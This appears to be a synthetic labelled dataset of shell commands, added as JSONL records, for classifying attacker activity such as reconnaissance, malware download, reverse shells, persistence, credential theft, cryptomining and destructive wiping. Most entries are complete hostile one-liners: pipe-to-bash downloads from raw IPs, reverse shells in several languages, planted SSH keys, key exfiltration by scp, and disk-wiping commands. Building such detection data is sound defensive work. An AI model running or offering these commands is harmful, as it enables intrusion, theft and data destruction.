+{"text": "cat /etc/resolv.conf > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:77"}
+{"text": "cd /home/ubuntu && echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s &", "label": "malware_downloader", "template": "malware_downloader:1"}
+{"text": "sudo -l", "label": "privilege_escalation", "template": "privilege_escalation:7"}
+{"text": "cd /var/tmp && chmod 777 update.armv5l 2>&1 &", "label": "malware_execution", "template": "malware_execution:4"}
+{"text": "cd /root && history -c 2>/dev/null", "label": "defense_evasion", "template": "defense_evasion:3"}
+{"text": "cd /usr/bin && ssh root@23.86.134.235 'uname -a' > /dev/null 2>&1", "label": "network_scan", "template": "network_scan:17"}
+{"text": "./kdevtmpfsi", "label": "cryptominer", "template": "cryptominer:10"}
+{"text": "echo 'IDOJDBB'", "label": "reconnaissance", "template": "reconnaissance:6"}
+{"text": "rm -rf .VYBIUJV 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:9"}
+{"text": "cd /mnt && history -w; history -c", "label": "defense_evasion", "template": "defense_evasion:5"}
+{"text": "systemctl enable init.sh.service", "label": "persistence", "template": "persistence:31"}
+{"text": "./spc", "label": "malware_execution", "template": "malware_execution:14"}
+{"text": "cd /usr/bin && ./xmrig --cpu-priority 5 -o xmr-eu1.nanopool.org:14444", "label": "cryptominer", "template": "cryptominer:22"}
+{"text": "cd /mnt && grep -r stratum+tcp /tmp >/dev/null", "label": "cryptominer", "template": "cryptominer:26"}
+{"text": "curl -fsSL http://141.185.64.252/mpsl | bash", "label": "malware_downloader", "template": "malware_downloader:28"}
+{"text": "echo YTUJBZDOK &", "label": "reconnaissance", "template": "reconnaissance:37"}
+{"text": "./scanner 89.204.210.226", "label": "network_scan", "template": "network_scan:31"}
+{"text": "echo '/etc/a.sh &' >> /etc/rc.local", "label": "persistence", "template": "persistence:19"}
+{"text": "cd /home/ubuntu; sh /etc/systemd-helper.sh", "label": "malware_execution", "template": "malware_execution:27"}
+{"text": "oh zkv", "label": "benign", "template": "benign:1"}
+{"text": "w\\get; chmod +x xmr.sh; ./systemd-helper &", "label": "malware_execution", "template": "malware_execution:48"}
+{"text": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 212.180.104.133 53 > /tmp/f", "label": "reverse_shell", "template": "reverse_shell:12"}
+{"text": "wget http://23.150.110.219/sshd -O-", "label": "malware_downloader", "template": "malware_downloader:13"}
+{"text": "cd /etc && tar xvf ld.sh.tgz; cd bins.sh; ./run", "label": "malware_execution", "template": "malware_execution:40"}
+{"text": "chmod +s /usr/bin/find", "label": "privilege_escalation", "template": "privilege_escalation:15"}
+{"text": "./monero-miner --pool pool.supportxmr.com:5555", "label": "cryptominer", "template": "cryptominer:27"}
+{"text": "mkfifo /tmp/p; nc 62.222.93.19 53 0</tmp/p | /bin/sh 1>/tmp/p 2>&1", "label": "reverse_shell", "template": "reverse_shell:13"}
+{"text": "cat /home/ftp/.ssh/id_ed25519", "label": "credential_access", "template": "credential_access:7"}
+{"text": "echo \"root:JDLOHTS57\"|chpasswd|bash", "label": "persistence", "template": "persistence:0"}
+{"text": "echo -e '\\x6b\\x61\\x6d\\x69/mnt' > /home/ubuntu/.nippon; cat /var/tmp/.nippon; rm /etc/.nippon", "label": "reconnaissance", "template": "reconnaissance:7"}
+{"text": "# fcike usiw (iddtfe)", "label": "benign", "template": "benign:15"}
+{"text": "wget http://203.213.88.31/files/update.sh && tar xzf systemd-helper.tar.gz", "label": "malware_downloader", "template": "malware_downloader:50"}
+{"text": "echo 'stratum+tcp://pool.supportxmr.com:5555' > pools.txt 2>/dev/null", "label": "cryptominer", "template": "cryptominer:25"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; echo 'wget -q http://dlhost.top/xmr.sh -O .c||curl -s https://5.80.210.172/dl/m68k -o .c||tftp -g -l .c -r mpsl 203.6.108.122' >> .s 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:6"}
+{"text": "cd /mnt; sh > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:22"}
+{"text": "ncrack -p 22 178.69.225.192", "label": "network_scan", "template": "network_scan:14"}
+{"text": "usermod -aG sudo test", "label": "persistence", "template": "persistence:28"}
+{"text": "./ethminer -P stratum://4zx5jEAmv0C5Uj9NKkkUG90DHSWcTiDGU1JdFbaTosK8GTS5aaMN5WmwZcGJGzaREcnP1sKDueTkZvgLurjeFvycizwQj5g@pool.supportxmr.com:5555", "label": "cryptominer", "template": "cryptominer:9"}
+{"text": "hydra -l root -P pass.txt ssh://77.246.191.121", "label": "network_scan", "template": "network_scan:11"}
+{"text": "wget http://193.113.125.72/tmp/tsunami && tar xzf m68k.tar.gz > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:50"}
+{"text": "cat /proc/cpuinfo", "label": "reconnaissance", "template": "reconnaissance:63"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; arp -a >/dev/null", "label": "network_scan", "template": "network_scan:29"}
+{"text": "file /bin/ls", "label": "reconnaissance", "template": "reconnaissance:112"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; hostname -I", "label": "reconnaissance", "template": "reconnaissance:57"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:3"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; export PATH=$PATH:/tmp && unset HISTFILE", "label": "defense_evasion", "template": "defense_evasion:39"}
+{"text": "cat /etc/group", "label": "reconnaissance", "template": "reconnaissance:133"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; echo \"ubuntu:THWF\" | chpasswd &", "label": "persistence", "template": "persistence:2"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; ftpget -v -u anonymous -p anonymous 77.112.129.225 gafgyt a.sh", "label": "malware_downloader", "template": "malware_downloader:44"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; echo \"ubuntu ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:29"}
+{"text": "LD_PRELOAD=/etc/mips.so ./bins.sh", "label": "malware_execution", "template": "malware_execution:45"}
+{"text": "find / -name \"*.pem\" 2>/dev/null >/dev/null", "label": "credential_access", "template": "credential_access:9"}
+{"text": "socat tcp-connect:107.71.217.208:5555 exec:/bin/sh", "label": "reverse_shell", "template": "reverse_shell:20"}
+{"text": "cd /dev/shm && rm -rf .IFKQQKPO .nxi > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:8"}
+{"text": "crontab /usr/bin/cron.txt", "label": "persistence", "template": "persistence:17"}
+{"text": "ls -l /tmp", "label": "benign", "template": "benign:36"}
+{"text": "cd /etc; cat /proc/cpuinfo >/dev/null", "label": "reconnaissance", "template": "reconnaissance:63"}
+{"text": "To: <sip:cipq@tmebqsmg>", "label": "benign", "template": "benign:5"}
+{"text": "head -c 0 > /dev/shm/inpla_sign", "label": "reconnaissance", "template": "reconnaissance:14"}
+{"text": "cd /var/tmp; /bin/busybox MIRAI", "label": "reconnaissance", "template": "reconnaissance:111"}
+{"text": "nc 77.165.246.162 31337 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:8"}
+{"text": "cd /etc && /bin/busybox BMSBMHU > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:25"}
+{"text": "history -c", "label": "defense_evasion", "template": "defense_evasion:3"}
+{"text": "echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s", "label": "malware_downloader", "template": "malware_downloader:0"}
+{"text": "python3 /var/tmp/kworkerds.py", "label": "malware_execution", "template": "malware_execution:32"}
+{"text": "rm .DPKQLB", "label": "reconnaissance", "template": "reconnaissance:11"}
+{"text": "for ip in $(cat ips.txt); do ssh root@$ip id; done >/dev/null", "label": "network_scan", "template": "network_scan:28"}
+{"text": "sysctl -w vm.nr_hugepages=128", "label": "cryptominer", "template": "cryptominer:19"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; top -bn1 | head -5 >/dev/null", "label": "reconnaissance", "template": "reconnaissance:83"}
+{"text": "grep -r 'password' /etc 2>/dev/null", "label": "credential_access", "template": "credential_access:30"}
+{"text": "./xmrig --cpu-priority 5 -o pool.minexmr.com:4444", "label": "cryptominer", "template": "cryptominer:22"}
+{"text": "python exploit.py", "label": "privilege_escalation", "template": "privilege_escalation:24"}
+{"text": "ruby -rsocket -e'f=TCPSocket.open(\"192.39.32.150\",9001).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "label": "reverse_shell", "template": "reverse_shell:18"}
+{"text": "ssh pi@45.118.46.52 'uname -a'", "label": "network_scan", "template": "network_scan:17"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; bash .wjq; rm -f .kvbnweq 2>/dev/null", "label": "malware_execution", "template": "malware_execution:2"}
+{"text": "score+5", "label": "benign", "template": "benign:22"}
+{"text": "curl -s http://185.66.105.135/cdn/x | sh", "label": "malware_downloader", "template": "malware_downloader:29"}
+{"text": "cat /etc/passwd /etc/shadow", "label": "credential_access", "template": "credential_access:1"}
+{"text": "mv /home/* /dev/null", "label": "destructive", "template": "destructive:26"}
+{"text": "ps aux | wc -l", "label": "reconnaissance", "template": "reconnaissance:82"}
+{"text": "wget -q -O - http://185.210.80.110/~u/sshd | bash", "label": "malware_downloader", "template": "malware_downloader:31"}
+{"text": "rm -rf /opt /srv /var", "label": "destructive", "template": "destructive:32"}
+{"text": "cd /tmp; curl -O http://mirrorupdate.info:80/x86_64; sh payload.sh >/dev/null", "label": "malware_downloader", "template": "malware_downloader:34"}
+{"text": "who", "label": "reconnaissance", "template": "reconnaissance:60"}
+{"text": "./spc > /dev/null 2>&1 &", "label": "malware_execution", "template": "malware_execution:17"}
+{"text": "cd /home/ubuntu && ./xmr.sh & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:47"}
+{"text": "cp /bin/bash /etc/.sh && chmod 4777 /etc/.sh", "label": "privilege_escalation", "template": "privilege_escalation:16"}
+{"text": "perl /var/tmp/init.sh.pl &", "label": "malware_execution", "template": "malware_execution:34"}
+{"text": "echo /mnt/a.sh.so >> /etc/ld.so.preload", "label": "persistence", "template": "persistence:36"}
+{"text": "busybox tftp -g -r m68k 103.77.247.93", "label": "malware_downloader", "template": "malware_downloader:41"}
+{"text": "which curl > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:97"}
+{"text": "./mimipenguin", "label": "credential_access", "template": "credential_access:36"}
+{"text": "cd /var/tmp; adduser user", "label": "persistence", "template": "persistence:25"}
+{"text": "echo \"*/5 * * * * curl -s https://bin-net.cn/x/kworkerds | sh\" | crontab -", "label": "persistence", "template": "persistence:13"}
+{"text": "echo -e '\\x90\\x5b\\x1b\\x0a\\xe0\\xdc\\x5d\\xe5\\xf2\\x35\\xa3\\x3f\\x7b\\x58\\x4f\\xc0\\x70\\xe3\\x8f\\xe7\\x6c\\xd7\\x5e\\xdd' >> setup.sh", "label": "malware_downloader", "template": "malware_downloader:10"}
+{"text": "/bin/busybox 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:44"}
+{"text": "cat /proc/self/cmdline", "label": "reconnaissance", "template": "reconnaissance:40"}
+{"text": "echo \"admin:MAEMJTEG\" | chpasswd >/dev/null", "label": "persistence", "template": "persistence:2"}
+{"text": "groups", "label": "reconnaissance", "template": "reconnaissance:132"}
+{"text": "tftp -g -r x86_64 178.80.22.220", "label": "malware_downloader", "template": "malware_downloader:42"}
+{"text": "echo -ne \"\\x26\\x8d\\x04\\x49\\x72\\x07\\x3e\\xd4\\xde\\xf5\\x8e\\x2f\\xfe\\x89\\xdb\\x6b\\xe9\\x10\\x2a\\xca\\x1b\\x26\\x15\\x82\\x5e\\x63\\x32\\x0c\\x55\\x4d\\xd7\\x74\" >> bot", "label": "malware_downloader", "template": "malware_downloader:8"}
+{"text": "lscpu", "label": "reconnaissance", "template": "reconnaissance:69"}
+{"text": "tftp 23.55.7.55 -c get bins.sh > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:43"}
+{"text": "cd /home/ubuntu && ./kaiten > /dev/null 2>&1 & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:17"}
+{"text": "wget http://dl-data.online/dl/ppc && tar xzf bins.sh.tar.gz &", "label": "malware_downloader", "template": "malware_downloader:50"}
+{"text": "python3 /mnt/a.sh.py", "label": "malware_execution", "template": "malware_execution:32"}
+{"text": "mkdir -p ~/.ssh", "label": "persistence", "template": "persistence:5"}
+{"text": "groups &", "label": "reconnaissance", "template": "reconnaissance:132"}
+{"text": "rm -rf --no-preserve-root /", "label": "destructive", "template": "destructive:2"}
+{"text": "cd /tmp && cd /dev/shm && wget http://212.102.39.102:8888/m68k 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:52"}
+{"text": "chattr +i ~/.ssh/authorized_keys >/dev/null", "label": "persistence", "template": "persistence:12"}
+{"text": "/bin/busybox ZLQA", "label": "reconnaissance", "template": "reconnaissance:25"}
+{"text": "printenv >/dev/null", "label": "reconnaissance", "template": "reconnaissance:93"}
+{"text": "nc -zv 141.212.204.34 1-1000", "label": "network_scan", "template": "network_scan:20"}
+{"text": "cat passwords.csv", "label": "credential_access", "template": "credential_access:26"}
+{"text": "cp /bin/bash /mnt/.sh && chmod 4777 /root/.sh", "label": "privilege_escalation", "template": "privilege_escalation:16"}
+{"text": "sudo /bin/bash", "label": "privilege_escalation", "template": "privilege_escalation:5"}
+{"text": "cd /usr/bin; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' &", "label": "reconnaissance", "template": "reconnaissance:67"}
+{"text": "chkconfig arm on", "label": "persistence", "template": "persistence:35"}
+{"text": "adduser oracle", "label": "persistence", "template": "persistence:25"}
+{"text": "cd /mnt; chmod 777 update.XDarmv5l 2>&1", "label": "malware_execution", "template": "malware_execution:4"}
+{"text": "cd /tmp; arch", "label": "reconnaissance", "template": "reconnaissance:107"}
+{"text": "echo \"root:CHMMT99\"|chpasswd|bash", "label": "persistence", "template": "persistence:0"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; ps aux | grep xmrig", "label": "cryptominer", "template": "cryptominer:16"}
+{"text": "gobuster dir -u http://45.157.121.47 -w w.txt", "label": "network_scan", "template": "network_scan:25"}
+{"text": "cat > /etc/systemd/system/payload.sh.service << EOF &", "label": "persistence", "template": "persistence:33"}
+{"text": "ldnumcq", "label": "benign", "template": "benign:0"}
+{"text": "cd /tmp; cd /var/run; cd /root; cat /dev/null > ~/.bash_history", "label": "defense_evasion", "template": "defense_evasion:17"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; getconf LONG_BIT &", "label": "reconnaissance", "template": "reconnaissance:106"}
+{"text": "ncat -z 62.96.195.121 22-443", "label": "network_scan", "template": "network_scan:22"}
+{"text": "cd /tmp && ftpget -v -u anonymous -p anonymous 203.213.201.104 systemd-helper sh4", "label": "malware_downloader", "template": "malware_downloader:44"}
+{"text": "asdf", "label": "benign", "template": "benign:25"}
+{"text": "ssh test@45.78.171.178 'uname -a'", "label": "network_scan", "template": "network_scan:17"}
+{"text": "busybox wget http://77.248.158.220/kaiten", "label": "malware_downloader", "template": "malware_downloader:39"}
+{"text": "/tmp/.kworkerds/x86_64", "label": "malware_execution", "template": "malware_execution:20"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; /bin/busybox cat /proc/self/exe || cat /proc/self/exe 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:29"}
+{"text": "php -r '$sock=fsockopen(\"212.206.111.25\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "label": "reverse_shell", "template": "reverse_shell:17"}
+{"text": "openssl s_client -quiet -connect 178.174.19.244:443 | /bin/sh | openssl s_client -quiet -connect 103.8.128.152:9999", "label": "reverse_shell", "template": "reverse_shell:22"}
+{"text": "ssh -o StrictHostKeyChecking=no support@23.171.146.254 id > /dev/null 2>&1", "label": "network_scan", "template": "network_scan:16"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; /bin/busybox wget http://89.128.14.129/~u/systemd-helper -O k &", "label": "malware_downloader", "template": "malware_downloader:40"}
+{"text": "fetch https://107.193.207.64:80/cdn/networkservice", "label": "malware_downloader", "template": "malware_downloader:47"}
+{"text": "./gafgyt &", "label": "malware_execution", "template": "malware_execution:5"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; echo 'user ALL=(ALL:ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:30"}
+{"text": "./minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 4LPnSe8ff0DMVG65NSUDQzTbpXQbqey21UVT0HbtFAQRagn8dfi0ZgFgqP2t9d4VtXyz3z0u0N7Yg1aovhfqY1oJ8TyiLgN -p x", "label": "cryptominer", "template": "cryptominer:4"}
+{"text": "history -c && history -w", "label": "defense_evasion", "template": "defense_evasion:4"}
+{"text": "cat a.sh | bash &", "label": "malware_execution", "template": "malware_execution:43"}
+{"text": "cd /dev/shm; cat init.sh | sh", "label": "malware_execution", "template": "malware_execution:42"}
+{"text": "sudo -u root /bin/sh", "label": "privilege_escalation", "template": "privilege_escalation:8"}
+{"text": "chmod +x kworkerds; sh x86_64", "label": "malware_execution", "template": "malware_execution:13"}
+{"text": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.20.21.83/cdn/sshd; curl -O http://cdn-dl.xyz/cdn/init.sh; chmod 777 k; sh ld.sh", "label": "malware_downloader", "template": "malware_downloader:35"}
+{"text": "hydra -l root -P pass.txt ssh://5.164.31.92", "label": "network_scan", "template": "network_scan:11"}
+{"text": "less log.txt", "label": "benign", "template": "benign:51"}
+{"text": "./miner --algo randomx --pool xmr-eu1.nanopool.org:14444 --user 45gWrW5g57jHtEgwScVhikH7woQiUvP9wATFzv11c0qA10EG2M4E7cdc5DjfxKUWSEBCPkkeasMFfQHg1vXsNneMJkUE7AH", "label": "cryptominer", "template": "cryptominer:23"}
+{"text": "bash -i >& /dev/tcp/77.235.135.49/9001 0>&1", "label": "reverse_shell", "template": "reverse_shell:0"}
+{"text": "echo -e \"fcbcqd32\\nRGQJP\\nLAZFH\"|passwd|bash", "label": "persistence", "template": "persistence:1"}
+{"text": "printenv", "label": "reconnaissance", "template": "reconnaissance:93"}
+{"text": "./kahxlkr", "label": "malware_execution", "template": "malware_execution:6"}
+{"text": "echo LXXIJESR_CHECK", "label": "reconnaissance", "template": "reconnaissance:36"}
+{"text": "df -h", "label": "reconnaissance", "template": "reconnaissance:71"}
+{"text": "ftpget -v -u anonymous -p anonymous 45.253.98.204 setup.sh kworkerds", "label": "malware_downloader", "template": "malware_downloader:44"}
+{"text": "cd /dev/shm && ./xmrig -o pool.minexmr.com:4444 -u 4RkinVZMofitmVaKFwa6iqN6YDWmigcL8BLCMLn2DfjPjMcZQNcBKbcfQNcMrJ1ydotAtwCQ18Trn6Y0iPnVyufNtzYvTGT -p x &", "label": "cryptominer", "template": "cryptominer:0"}
+{"text": "php mpsl.php", "label": "malware_execution", "template": "malware_execution:35"}
+{"text": "adduser admin 2>/dev/null", "label": "persistence", "template": "persistence:25"}
+{"text": "gobuster dir -u http://107.97.85.231 -w w.txt", "label": "network_scan", "template": "network_scan:25"}
+{"text": "aria2c http://89.153.3.65:80/files/mips", "label": "malware_downloader", "template": "malware_downloader:46"}
+{"text": "shred -vfz -n 5 /dev/sda", "label": "destructive", "template": "destructive:17"}
+{"text": "GET / HTTP/1.1", "label": "benign", "template": "benign:29"}
+{"text": "cd /var/run; curl -O http://193.196.171.200/dl/kworkerds; sh update.sh 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:34"}
+{"text": "find / -perm -4000 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:10"}
+{"text": "ps -ef | grep -i miner | grep -v grep", "label": "cryptominer", "template": "cryptominer:17"}
+{"text": "sh .s; rm -f .s", "label": "malware_execution", "template": "malware_execution:0"}
+{"text": "Call-ID: 70000", "label": "benign", "template": "benign:3"}
+{"text": "./dirtycow > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:22"}
+{"text": "cat /etc/issue", "label": "reconnaissance", "template": "reconnaissance:73"}
+{"text": "cd /tmp; /bin/./uname -s -v -n -r -m", "label": "reconnaissance", "template": "reconnaissance:42"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; for ip in $(cat ips.txt); do ssh root@$ip id; done", "label": "network_scan", "template": "network_scan:28"}
+{"text": "ls -la /dev/shm", "label": "reconnaissance", "template": "reconnaissance:103"}
+{"text": "scp -r /var/tmp/data root@103.122.133.38:/tmp", "label": "network_scan", "template": "network_scan:19"}
+{"text": "cd /var/run; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEFBoIOGbkq++BXPQgoJQlVCgzIzWRbL4tWA+YRkNuiHbmmx+n2A531Y0m1L72dLycswPbCsijfoT5EsJISqC2wnoOo9YNvRaZqvLUp/VirTHkhS support@kali\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh >/dev/null", "label": "persistence", "template": "persistence:9"}
+{"text": "curl -k https://net.pkg.top/xmr.sh | bash 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:55"}
+{"text": "./cpuminer -a scrypt -o stratum+tcp://pool.minexmr.com:4444 -u oracle", "label": "cryptominer", "template": "cryptominer:6"}
+{"text": "whoami", "label": "reconnaissance", "template": "reconnaissance:54"}
+{"text": "w", "label": "reconnaissance", "template": "reconnaissance:59"}
+{"text": "echo XPUYVLOK", "label": "reconnaissance", "template": "reconnaissance:37"}
+{"text": "cd ~", "label": "benign", "template": "benign:42"}
+{"text": "cd /etc; echo -ne \"\\x62\\xf5\\x32\\x1b\\xd7\\x48\\xda\\xb3\\x80\\x23\\xf1\\x77\\x1c\\xe8\\xe8\\x28\\xe9\\xac\\x7f\\x63\\xa3\\x97\\x34\\x8d\\x1b\\xd3\\x68\\xbd\\x27\\x9e\\x55\\xa3\" >> update.sh", "label": "malware_downloader", "template": "malware_downloader:11"}
+{"text": "To: <sip:njyrkym@lhjosmum>", "label": "benign", "template": "benign:5"}
+{"text": "ssh root@62.125.83.14 2>/dev/null", "label": "network_scan", "template": "network_scan:15"}
+{"text": "cd /dev/shm && wget http://103.11.45.11/files/systemd-helper >/dev/null", "label": "malware_downloader", "template": "malware_downloader:52"}
+{"text": "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRE2JSZl3gDSWkRIFimX7KRApwyYMGsbMaOaOVpBJYTfVt4RTALf4KMasXQ5mT7kMiZf+o4vzB02u/oTd+ root@kali\" >> /root/.ssh/authorized_keys", "label": "persistence", "template": "persistence:4"}
+{"text": "nslookup google.com", "label": "reconnaissance", "template": "reconnaissance:120"}
+{"text": "./scan 22", "label": "network_scan", "template": "network_scan:8"}
+{"text": "cd /var/run; dmidecode -t system", "label": "reconnaissance", "template": "reconnaissance:124"}
+{"text": "ls -l ynr_2 2>/dev/null || echo '0'", "label": "reconnaissance", "template": "reconnaissance:12"}
+{"text": "echo /root/clean.sh.so >> /etc/ld.so.preload 2>/dev/null", "label": "persistence", "template": "persistence:36"}
+{"text": "chattr -ia /root/.ssh/authorized_keys &", "label": "defense_evasion", "template": "defense_evasion:37"}
+{"text": "mkfs -t ext4 /dev/sda 2>/dev/null", "label": "destructive", "template": "destructive:14"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; /tmp/.k/x86_64 &", "label": "malware_execution", "template": "malware_execution:20"}
+{"text": "su - root", "label": "privilege_escalation", "template": "privilege_escalation:32"}
+{"text": "python3 /var/tmp/x86.py", "label": "malware_execution", "template": "malware_execution:32"}
+{"text": "./spc &", "label": "malware_execution", "template": "malware_execution:16"}
+{"text": "cd /usr/bin; curl -s http://178.88.23.228/dl/mips -o /tmp/networkservice", "label": "malware_downloader", "template": "malware_downloader:26"}
+{"text": "wget ftp://107.244.110.192/update.sh", "label": "malware_downloader", "template": "malware_downloader:48"}
+{"text": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAq5kNxQGczZTZ2V45LtL4Y/XRlx2eHs2kngnVADBqCv/5+AH7Pt24iEwZxS444== mdrfckr' >> ~/.ssh/authorized_keys", "label": "persistence", "template": "persistence:3"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; wget ftp://192.8.248.134/sshd >/dev/null", "label": "malware_downloader", "template": "malware_downloader:48"}
+{"text": "echo '/var/tmp/bins.sh' > /etc/ld.so.preload", "label": "persistence", "template": "persistence:37"}
+{"text": "./ppc &", "label": "malware_execution", "template": "malware_execution:5"}
+{"text": "openssl s_client -quiet -connect 62.230.100.200:9001 | /bin/sh | openssl s_client -quiet -connect 107.207.246.203:9999", "label": "reverse_shell", "template": "reverse_shell:22"}
+{"text": "ps aux >/dev/null", "label": "reconnaissance", "template": "reconnaissance:79"}
+{"text": "wget http://nodestatic.club/run -O /mnt/mpsl && chmod 777 /home/ubuntu/clean.sh && /var/tmp/xmr.sh", "label": "malware_downloader", "template": "malware_downloader:38"}
+{"text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"5.48.45.49\",6666));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "label": "reverse_shell", "template": "reverse_shell:15"}
+{"text": "cp /bin/bash /var/run/.sh && chmod 4777 /root/.sh", "label": "privilege_escalation", "template": "privilege_escalation:16"}
+{"text": "rm -rf .GEVJVR", "label": "reconnaissance", "template": "reconnaissance:9"}
+{"text": "cd /etc; cat a.sh | bash", "label": "malware_execution", "template": "malware_execution:43"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; update-rc.d x86_64 defaults > /dev/null 2>&1", "label": "persistence", "template": "persistence:34"}
+{"text": "/var/tmp/x86 &", "label": "malware_execution", "template": "malware_execution:19"}
+{"text": "perl networkservice.pl", "label": "malware_execution", "template": "malware_execution:33"}
+{"text": "sh xmr.sh.sh", "label": "malware_execution", "template": "malware_execution:25"}
+{"text": "chmod 755 /etc/networkservice", "label": "malware_execution", "template": "malware_execution:10"}
+{"text": "cd /var/run && ip addr show", "label": "reconnaissance", "template": "reconnaissance:90"}
+{"text": "./xmrig -o pool.supportxmr.com:5555 -u 4NvMza1CG0AZgwdsi9eZHx7hMeuJC74uGVo25hpnmn1JKQzXnt19cgJPSQRSgMoJ7PPnZ7xWkgqXYeDsazz3B7KDpGjgcmM -p x", "label": "cryptominer", "template": "cryptominer:0"}
+{"text": "scp ~/.ssh/id_rsa ubuntu@45.214.152.251:/tmp &", "label": "credential_access", "template": "credential_access:33"}
+{"text": "dd if=/dev/zero of=/dev/nvme0n1", "label": "destructive", "template": "destructive:12"}
+{"text": "./init.sh &", "label": "malware_execution", "template": "malware_execution:16"}
+{"text": "./amq", "label": "malware_execution", "template": "malware_execution:6"}
+{"text": ">/usr/bin/.VWBHL && cd /tmp/ >/dev/null", "label": "reconnaissance", "template": "reconnaissance:31"}
+{"text": "cat /home/admin/.bash_history", "label": "credential_access", "template": "credential_access:27"}
+{"text": "Content-Length: 7", "label": "benign", "template": "benign:7"}
+{"text": "cd /var/run; echo 'root:arm123' | chpasswd", "label": "persistence", "template": "persistence:27"}
+{"text": "enable; system; shell; sh &", "label": "reconnaissance", "template": "reconnaissance:24"}
+{"text": "cd /tmp; cd /var/run; cd /root; cd /var/tmp; chmod +x x; ./payload.sh 2>/dev/null", "label": "malware_execution", "template": "malware_execution:46"}
+{"text": "fetch http://datanode.ru/~u/gafgyt >/dev/null", "label": "malware_downloader", "template": "malware_downloader:47"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; rm -rf /root/*", "label": "destructive", "template": "destructive:30"}
+{"text": ">/ERQQVF && cd /", "label": "reconnaissance", "template": "reconnaissance:32"}
+{"text": "chmod 600 ~/.ssh/authorized_keys", "label": "persistence", "template": "persistence:11"}
+{"text": "find / -name \"*.conf\" 2>/dev/null | head", "label": "reconnaissance", "template": "reconnaissance:105"}
+{"text": "last", "label": "reconnaissance", "template": "reconnaissance:61"}
+{"text": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 103.108.232.78 4444 > /tmp/f", "label": "reverse_shell", "template": "reverse_shell:12"}
+{"text": "nikto -h 203.147.213.220", "label": "network_scan", "template": "network_scan:23"}
+{"text": "cat /home/support/.ssh/id_ed25519", "label": "credential_access", "template": "credential_access:7"}
+{"text": "echo 'XICVEH'", "label": "reconnaissance", "template": "reconnaissance:6"}
+{"text": "ykm", "label": "benign", "template": "benign:0"}
+{"text": "cd /root; mkfs.ext4 /dev/sda1 > /dev/null 2>&1", "label": "destructive", "template": "destructive:13"}
+{"text": "wget -c http://5.6.187.250/tmp/payload.sh", "label": "malware_downloader", "template": "malware_downloader:21"}
+{"text": "w\\get; chmod +x x86; ./ld.sh", "label": "malware_execution", "template": "malware_execution:48"}
+{"text": "cd /var/tmp && wget http://178.112.109.224/spc && chmod 777 bins.sh && ./init.sh", "label": "malware_downloader", "template": "malware_downloader:33"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; cat /root/.ssh/id_rsa", "label": "credential_access", "template": "credential_access:5"}
+{"text": "cat passwords.csv &", "label": "credential_access", "template": "credential_access:26"}
+{"text": "cd /etc; sysctl -w vm.nr_hugepages=128", "label": "cryptominer", "template": "cryptominer:19"}
+{"text": "cd /etc; passwd ftp > /dev/null 2>&1", "label": "persistence", "template": "persistence:30"}
